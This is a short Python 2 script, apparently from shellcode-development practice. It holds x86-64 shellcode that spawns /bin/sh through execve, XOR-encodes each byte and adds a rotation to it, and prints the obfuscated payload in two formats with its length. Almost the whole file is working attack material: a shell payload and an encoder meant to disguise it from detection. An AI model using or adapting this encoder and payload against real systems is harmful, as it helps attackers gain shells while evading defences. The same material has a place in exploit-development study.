#!/usr/bin/python

shellcode = (
"\x48\x31\xc0\x48\x31\xf6\x48\x31\xdb\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
)

encoded = ""
encoded2 = ""

rot = 24

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :

                                y = x^0x36
                                z = (y + rot)%256

                                encoded += '\\x'
                                encoded += '%02x' % z

                                encoded2 += '0x'
                                encoded2 += '%02x,' % z


print '"' + encoded + '"'

print encoded2

print 'Len: %d' % len(bytearray(shellcode))
